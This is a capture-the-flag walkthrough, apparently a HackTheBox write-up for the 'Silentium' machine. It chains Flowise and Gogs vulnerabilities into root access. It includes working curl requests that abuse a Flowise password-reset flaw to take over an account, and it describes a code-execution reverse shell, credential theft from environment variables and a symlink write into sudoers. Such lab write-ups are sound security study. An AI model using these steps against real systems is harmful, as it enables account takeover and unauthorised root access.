---
layout: post
title: "Silentium"
date: 2026-06-12
categories: [Machine]
difficulty: Easy
platform: HackTheBox
tags: [linux]
excerpt: "Exploiting Flowise and Gogs vulnerabilities."
---

## Enumeration

Initial enumeration revealed only SSH and HTTP exposed externally.

```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP> -oN nmap.txt
```

Results:

```text
22/tcp open ssh
80/tcp open http
```

Visiting the web application redirected to `silentium.htb`, so the hostname was added locally:

```bash
echo "<TARGET_IP> silentium.htb" | sudo tee -a /etc/hosts
```

Since only HTTP was exposed, virtual host enumeration was the next step.

```bash
gobuster vhost \
-u http://silentium.htb \
-w /usr/share/wordlists/dirb/common.txt \
--append-domain
```

Discovered:

```text
staging.silentium.htb
```

After updating `/etc/hosts`, the new virtual host exposed a Flowise instance.

---

## User Flag

### CVE-2025-58434 

The Flowise instance exposed a vulnerable forgot-password endpoint that returned password reset tokens directly inside the API response:

```bash
curl -X POST \
http://staging.silentium.htb/api/v1/account/forgot-password \
-H "Content-Type: application/json" \
-d '{"user":{"email":"ben@silentium.htb"}}'
```

The response included a valid `tempToken`. The password was reset using:

```bash
curl -X POST \
http://staging.silentium.htb/api/v1/account/reset-password \
-H "Content-Type: application/json" \
-d '{
"tempToken":"<TOKEN>",
"password":"<NEW_PASSWORD>",
"confirmPassword":"<NEW_PASSWORD>"
}'
```

After authentication, access to the Flowise dashboard was obtained.


### CVE-2025-59528 

Flowise 3.0.5 contained an insecure evaluation issue in `customMCP`.

Using the generated API key, arbitrary JavaScript execution was achieved through the endpoint:

```text
/api/v1/node-load-method/customMCP
```

This payload executed commands on the backend and returned a reverse shell. That landed a shell inside the Flowise Docker container.


### Pivot to Host

Container enumeration revealed credentials stored in environment variables:

```bash
env
```

Relevant values:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=<REDACTED>
```

Using SSH:

```bash
ssh ben@silentium.htb
```

We obtained Host access and the User Flag.

---

## Privilege Escalation

Local enumeration identified an internal Gogs instance running as root. A tunnel exposed the service:

```bash
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb
```

### CVE-2025-8110

The vulnerability allowed arbitrary file modification through symlink handling.

A repository containing a symbolic link targeting `/etc/sudoers.d/` was created and updated through the API.

This granted passwordless sudo access.

Verification:

```bash
sudo id
...
uid=0(root)
```



